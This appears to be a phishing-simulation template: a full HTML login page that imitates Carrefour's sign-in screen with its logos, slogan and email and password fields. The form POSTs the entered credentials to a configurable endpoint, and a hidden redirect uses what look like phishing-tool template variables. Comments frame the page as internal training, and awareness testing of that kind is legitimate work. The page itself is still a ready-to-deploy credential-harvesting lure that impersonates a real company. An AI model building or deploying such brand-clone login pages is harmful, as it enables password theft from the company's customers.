<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="robots" content="none" />
  <title>Authentification Carrefour - Concept</title>

  <style>
    :root{
      --blue:#0b63ff;
      --blue2:#0a56e6;
      --text:#0b1b3a;
      --muted:#6b7280;
      --border:#cfd6df;
      --line:#d7dbe2;
      --shadow: 0 18px 40px rgba(0,0,0,.18);

      /* Background piloté par JS (fallback CSS) */
      --left-image: url("https://images.unsplash.com/photo-1512621776951-a57141f2eefd?auto=format&fit=crop&w=1600&q=80");
      --right-color: #5f6fbb;
    }

    *{ box-sizing:border-box; }
    html, body{ height:100%; }
    body{
      margin:0;
      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
      color:var(--text);
      background:#fff;
    }

    /* ===== Layout stable (hybride PC/mobile) ===== */
    .layout{
      min-height:100vh;
      display:grid;
      grid-template-columns: 30% 1fr 30%;
    }
    .left{
      background: var(--left-image) center/cover no-repeat;
      position:relative;
      z-index:0; /* v1.3.3.1: derrière */
    }
    .center{
      position:relative;
      display:flex;
      align-items:center;
      justify-content:center;
      padding: clamp(16px, 2.2vw, 28px);
      background: transparent; /* v1.3.3.1: laisse passer les backgrounds */
      z-index:2;               /* v1.3.3.1: au-dessus des backgrounds */
    }
    .right{
      position:relative;
      background: var(--right-color);
      overflow:hidden;
      z-index:0; /* v1.3.3.1: derrière */
    }

    /* ===== Slogan modernisé ===== */
    .slogan{
      position:absolute;
      top:50%;
      right:14%;
      transform:translateY(-50%);
      color:#fff;
      max-width: 460px;
      padding: 8px;
    }
    .slogan h1{
      margin:0;
      font-size: clamp(44px, 4vw, 70px);
      line-height: .92;
      letter-spacing: -0.035em;
      font-weight: 950;
    }
    .slogan .lead{
      display:block;
      font-weight: 650;
      opacity:.92;
      letter-spacing:-0.02em;
      font-size: clamp(16px, 1.3vw, 18px);
      margin-bottom: 10px;
    }
    .slogan .bar{
      width:72px;
      height:6px;
      border-radius:999px;
      background: rgba(255,255,255,.28);
      margin-top:18px;
    }

    /* ===== Card (v1.3.3: plus large sur desktop) ===== */
    .login-card{
      position:relative;
      z-index:3; /* v1.3.3.1: au-dessus des backgrounds */
      width: min(760px, 100%);
      background: rgba(255,255,255,.98);
      border-radius: 14px;
      box-shadow: var(--shadow);
      padding: 26px 44px 22px;
      backdrop-filter: saturate(1.05);
    }

    .login-header{
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:16px;
      margin-bottom:16px;
    }
    .back{
      display:inline-flex;
      align-items:center;
      gap:8px;
      text-decoration:none;
      color:var(--blue);
      font-size:13px;
      font-weight:650;
      white-space:nowrap;
    }
    .chev{ font-size:16px; line-height:1; }

    .brands{
      margin-left:auto;
      display:flex;
      gap:14px;
      align-items:center;
    }
    .brands img{
      height:22px;
      width:auto;
      display:block;
      object-fit:contain;
    }

    .tabs{
      display:flex;
      border-bottom:1px solid var(--line);
      margin-bottom:16px;
      position:relative;
    }
    .tab{
      flex:1;
      padding:10px 0 12px;
      border:none;
      background:transparent;
      font-size:13px;
      font-weight:750;
      color:#334155;
      cursor:pointer;
    }
    .tab.active{ color:var(--blue); }
    .underline{
      position:absolute;
      bottom:-1px;
      left:0;
      width:50%;
      height:2px;
      background:var(--blue);
      transition:left .15s ease;
    }

    .title{
      text-align:center;
      font-size:18px;
      font-weight:950;
      margin:10px 0 18px;
    }

    form{ display:flex; flex-direction:column; gap:14px; margin:0; }
    .field{ position:relative; }
    input{
      width:100%;
      height:46px;
      border:1px solid var(--border);
      border-radius:8px;
      padding:0 12px;
      font-size:14px;
      outline:none;
      background:#fff;
    }
    input::placeholder{ color:#9aa3af; }
    input:focus{
      border-color: rgba(11,99,255,.65);
      box-shadow: 0 0 0 3px rgba(11,99,255,.10);
    }

    .eye{
      position:absolute;
      right:10px;
      top:50%;
      transform:translateY(-50%);
      border:none;
      background:transparent;
      color:var(--blue);
      cursor:pointer;
      font-size:14px;
      padding:6px 8px;
      border-radius:10px;
    }

    .row{
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:12px;
      font-size:12px;
      color:#4b5563;
    }
    .remember{ display:flex; align-items:center; gap:8px; user-select:none; }
    .remember input{ width:12px; height:12px; }
    .forgot{
      color:var(--blue);
      text-decoration:none;
      font-weight:900;
      font-size:11px;
      white-space:nowrap;
    }

    .cta{
      height:42px;
      border:none;
      border-radius:10px;
      background:var(--blue2);
      color:#fff;
      font-weight:950;
      font-size:12px;
      letter-spacing:.4px;
      text-transform:uppercase;
      cursor:pointer;
    }

    .footer{
      position:absolute;
      bottom:14px;
      left:0; right:0;
      text-align:center;
      font-size:12px;
      color:#94a3b8;
      pointer-events:none;
      z-index:2;
    }

    /* ===== Notes de patch (popover bas-gauche) ===== */
    .info-btn{
      position:fixed;
      left:14px;
      bottom:14px;
      z-index:50;
      width:34px;
      height:34px;
      border-radius:999px;
      border:1px solid rgba(148,163,184,.55);
      background:#fff;
      color:#334155;
      box-shadow: 0 10px 22px rgba(0,0,0,.10);
      cursor:pointer;
      display:grid;
      place-items:center;
      font-weight:950;
      line-height:1;
    }

    .patch-pop{
      position:fixed;
      left:14px;
      bottom:58px;
      z-index:55;
      width:min(360px, calc(100vw - 28px));
      background:#fff;
      border:1px solid rgba(203,213,225,.8);
      border-radius:14px;
      box-shadow: 0 18px 40px rgba(0,0,0,.16);
      padding:12px;
    }
    .patch-pop[hidden]{ display:none; }

    .patch-head{
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:10px;
      margin-bottom:10px;
    }
    .patch-title{
      margin:0;
      font-size:13px;
      font-weight:950;
      color:#0f172a;
    }
    .patch-close{
      border:none;
      background:#f1f5f9;
      border-radius:10px;
      padding:7px 10px;
      cursor:pointer;
      font-weight:950;
      font-size:12px;
    }

    .patch-controls{
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:10px;
      margin-bottom:10px;
    }
    .patch-controls label{
      font-size:12px;
      color:#334155;
      font-weight:800;
    }
    .patch-controls select{
      flex:1;
      height:34px;
      border-radius:10px;
      border:1px solid rgba(203,213,225,.95);
      padding:0 10px;
      font-size:12px;
      background:#fff;
      outline:none;
    }

    .patch-body{
      font-size:12px;
      color:#334155;
      line-height:1.35;
      max-height: 180px;
      overflow:auto;
      padding-right:4px;
    }
    .patch-body ul{
      margin:6px 0 0;
      padding-left:18px;
    }

    /* ===== Responsive (hybride) ===== */
    @media (max-width: 1200px){
      .login-card{ width: min(680px, 100%); padding: 24px 34px 20px; }
    }
    @media (max-width: 900px){
      .layout{ grid-template-columns: 50% 1fr; }
      .right{ display:none; }
      .login-card{ width: min(620px, 100%); }
    }
    @media (max-width: 620px){
      .layout{ grid-template-columns: 1fr; }
      .left{ height:220px; }
      .center{ align-items:flex-start; }
      .login-card{ width: 100%; margin-top:-64px; padding: 20px 18px 18px; }
      .footer{ position:static; margin:14px 0 0; }
      .brands img{ height:20px; }
    }
    @media (max-width: 380px){
      .login-header{ flex-wrap:wrap; }
      .brands{ width:100%; justify-content:flex-end; }
    }
  </style>
</head>

<body>
  <div class="layout">
    <div class="left" aria-hidden="true"></div>

    <main class="center">
      <section class="login-card" role="dialog" aria-label="Connexion">
        <header class="login-header">
          <a class="back" href="#" id="backBtn" aria-label="Retour">
            <span class="chev">‹</span> Retour
          </a>

          <div class="brands" aria-label="Marques">
            <!-- Mets des chemins web valides -->
            <img src="assets/carrefour.svg" alt="Carrefour" />
            <img src="assets/carrefour-pro.svg" alt="Carrefour Pro" />
          </div>
        </header>

        <nav class="tabs" aria-label="Onglets">
          <button class="tab active" type="button" aria-selected="true">Connexion</button>
          <button class="tab" type="button" aria-selected="false">Inscription</button>
          <div class="underline" aria-hidden="true"></div>
        </nav>

        <h1 class="title">Content de vous (re)voir&nbsp;!</h1>

        <!-- POST HTML générique (à pointer vers ton endpoint interne de formation) -->
        <form id="loginForm" method="POST" action="TRAINING_POST_URL" autocomplete="on">
          <div class="field">
            <input id="email" name="email" type="email" placeholder="E-mail *" autocomplete="username" required />
          </div>

          <div class="field">
            <input id="pwd" name="password" type="password" placeholder="Mot de passe *" autocomplete="current-password" required />
            <button id="togglePwd" class="eye" type="button" aria-label="Afficher/Masquer le mot de passe">👁</button>
          </div>

          <div class="row">
            <label class="remember">
              <input id="remember" name="remember" type="checkbox" checked />
              Rester connecté
            </label>
            <a class="forgot" href="#" id="forgotBtn">Mot de passe oublié&nbsp;?</a>
          </div>

          <!-- Si ton serveur utilise un redirect -->
          <input type="hidden" name="redirect" value="{{.URL}}" />

          <button class="cta" type="submit">ME CONNECTER</button>
        </form>

        <div class="footer">© Concept — Démo UI</div>
      </section>
    </main>

    <aside class="right" aria-hidden="true">
      <div class="slogan" id="slogan"></div>
    </aside>
  </div>

  <!-- Bouton “i” -->
  <button class="info-btn" id="infoBtn" aria-label="Notes de patch">i</button>

  <!-- Popover Notes de patch (petit, bas-gauche) -->
  <section class="patch-pop" id="patchPop" hidden aria-label="Notes de patch">
    <div class="patch-head">
      <h2 class="patch-title">Notes de patch</h2>
      <button class="patch-close" id="patchClose" type="button">Fermer</button>
    </div>

    <div class="patch-controls">
      <label for="patchSelect">Version</label>
      <select id="patchSelect" aria-label="Sélection de version"></select>
    </div>

    <div class="patch-body" id="patchBody"></div>
  </section>

  <script>
    const $ = (sel) => document.querySelector(sel);

    // ===== 1) Background config : JSON si possible, sinon fallback inline =====
    const INLINE_BG_CONFIG = {
      leftImageUrl: "https://images.unsplash.com/photo-1512621776951-a57141f2eefd?auto=format&fit=crop&w=1600&q=80",
      rightColor: "#5f6fbb",
      sloganLead: "Bienvenue chez",
      sloganBrand: "Carrefour",
      showBar: true
    };

    async function loadBgConfig(){
      // fetch background.json peut échouer en file:// => fallback inline
      try{
        const r = await fetch("background.json?_=" + Date.now(), { cache: "no-store" });
        if (!r.ok) throw new Error("background.json not ok");
        const data = await r.json();

        // Schéma tolérant pour éviter bugs
        return {
          leftImageUrl: data.leftImageUrl || data.image || data.left || INLINE_BG_CONFIG.leftImageUrl,
          rightColor: data.rightColor || data.backgroundColor || data.violet || INLINE_BG_CONFIG.rightColor,
          sloganLead: data.sloganLead || "Bienvenue chez",
          sloganBrand: data.sloganBrand || "Carrefour",
          showBar: (data.showBar ?? true)
        };
      }catch{
        return INLINE_BG_CONFIG;
      }
    }

    function escapeHtml(str){
      return String(str)
        .replaceAll("&","&amp;")
        .replaceAll("<","&lt;")
        .replaceAll(">","&gt;")
        .replaceAll('"',"&quot;")
        .replaceAll("'","&#039;");
    }

    function applyBgConfig(cfg){
      const root = document.documentElement;

      if (cfg.leftImageUrl) root.style.setProperty("--left-image", `url("${cfg.leftImageUrl}")`);
      if (cfg.rightColor) root.style.setProperty("--right-color", cfg.rightColor);

      const slogan = $("#slogan");
      if (slogan) {
        const lead = cfg.sloganLead || "Bienvenue chez";
        const brand = cfg.sloganBrand || "Carrefour";
        slogan.innerHTML = `
          <div class="lead">${escapeHtml(lead)}</div>
          <h1>${escapeHtml(brand)}<span style="opacity:.9">.</span></h1>
          ${cfg.showBar ? `<div class="bar"></div>` : ``}
        `;
      }
    }

    // ===== 2) Notes de patch (dernier par défaut + dropdown historique) =====
    const PATCH_NOTES = {
      "v1.3.3.1": [
        "Les backgrounds gauche (image) et droit (violet) passent derrière la carte de connexion.",
        "La colonne centrale devient transparente, la carte est affichée en surcouche (z-index maîtrisé).",
        "Effet de carte flottante (fond légèrement translucide + saturation) pour un rendu plus moderne.",
        "Notes de patch : version par défaut mise à jour sur la dernière (v1.3.3.1)."
      ],
      "v1.3.3": [
        "Agrandissement de la carte de connexion sur desktop (largeur + padding) pour un rendu moins étroit.",
        "Ajustements responsive : largeurs graduelles selon breakpoints (1200/900/620) pour un rendu hybride PC/mobile plus naturel.",
        "Notes de patch : version par défaut mise à jour sur la dernière (v1.3.3)."
      ],
      "v1.3.2": [
        "Refonte de la logique background : suppression des couches 'fixed' et stabilisation via un layout grid (moins de bugs d’affichage).",
        "Renommage du changelog en 'Notes de patch' et remplacement du modal plein écran par un popover compact en bas à gauche.",
        "Affichage par défaut uniquement de la dernière version + menu déroulant pour consulter l’historique.",
        "Amélioration du rendu hybride PC/mobile : 3 colonnes desktop, 2 colonnes tablette, empilement mobile."
      ],
      "v1.3.1": [
        "Centrage corrigé : carte centrée dans la colonne du milieu via un layout grid 3 panneaux.",
        "Suppression du positionnement 'fixed' de la carte (moins de décalage visuel).",
        "Bienvenue modernisé : hiérarchie typographique, interlettrage, meilleure mise en forme.",
        "Connexion : remplacement de fetch par un POST HTML natif (évite CORS / file:// 'Erreur réseau').",
        "Changelog cumulatif conservé."
      ],
      "v1.3": [
        "Ajout d’un POST de connexion générique vers un endpoint configurable.",
        "Redirection et gestion de réponses serveur (selon implémentation).",
        "Ajout d’un changelog consultable."
      ],
      "v1.2": [
        "Nettoyage du HTML/CSS/JS, structure simplifiée.",
        "Logos alignés à droite, toggle mot de passe, tabs conservés.",
        "Bouton “i” + popup d’infos."
      ]
    };

    const LATEST_VERSION = "v1.3.3.1";

    function renderPatchNotes(version){
      const body = $("#patchBody");
      if (!body) return;

      const items = PATCH_NOTES[version] || [];
      body.innerHTML = `
        <div style="font-weight:950; margin-bottom:6px;">${escapeHtml(version)}</div>
        <ul>${items.map(i => `<li>${escapeHtml(i)}</li>`).join("")}</ul>
      `;
    }

    function initPatchNotesUI(){
      const pop = $("#patchPop");
      const btn = $("#infoBtn");
      const close = $("#patchClose");
      const select = $("#patchSelect");
      if (!pop || !btn || !close || !select) return;

      const versions = Object.keys(PATCH_NOTES);

      // Latest en premier, puis tri décroissant
      versions.sort((a,b) => {
        if (a === LATEST_VERSION) return -1;
        if (b === LATEST_VERSION) return 1;
        return b.localeCompare(a);
      });

      select.innerHTML = versions
        .map(v => `<option value="${v}">${v}${v === LATEST_VERSION ? " (dernier)" : ""}</option>`)
        .join("");

      select.value = LATEST_VERSION;
      renderPatchNotes(LATEST_VERSION);

      function openPop(){
        pop.hidden = false;
        select.focus();
      }
      function closePop(){
        pop.hidden = true;
        btn.focus();
      }

      btn.addEventListener("click", () => {
        if (pop.hidden) openPop();
        else closePop();
      });

      close.addEventListener("click", closePop);

      // Click dehors => fermer
      document.addEventListener("click", (e) => {
        if (pop.hidden) return;
        const inside = pop.contains(e.target) || btn.contains(e.target);
        if (!inside) closePop();
      });

      // ESC => fermer
      document.addEventListener("keydown", (e) => {
        if (e.key === "Escape" && !pop.hidden) closePop();
      });

      select.addEventListener("change", () => {
        renderPatchNotes(select.value);
      });
    }

    // ===== 3) UI =====
    function initUI(){
      // Toggle password
      const pwd = $("#pwd");
      const toggle = $("#togglePwd");
      toggle?.addEventListener("click", () => {
        if (!pwd) return;
        const isPwd = pwd.type === "password";
        pwd.type = isPwd ? "text" : "password";
        toggle.textContent = isPwd ? "🙈" : "👁";
      });

      // Tabs underline
      const tabs = Array.from(document.querySelectorAll(".tab"));
      const underline = $(".underline");
      tabs.forEach((t, idx) => {
        t.addEventListener("click", () => {
          tabs.forEach(x => { x.classList.remove("active"); x.setAttribute("aria-selected","false"); });
          t.classList.add("active");
          t.setAttribute("aria-selected","true");
          if (underline) underline.style.left = idx === 0 ? "0" : "50%";
        });
      });
    }

    // ===== Boot =====
    document.addEventListener("DOMContentLoaded", async () => {
      const cfg = await loadBgConfig();
      applyBgConfig(cfg);
      initUI();
      initPatchNotesUI();
    });
  </script>
</body>
</html>
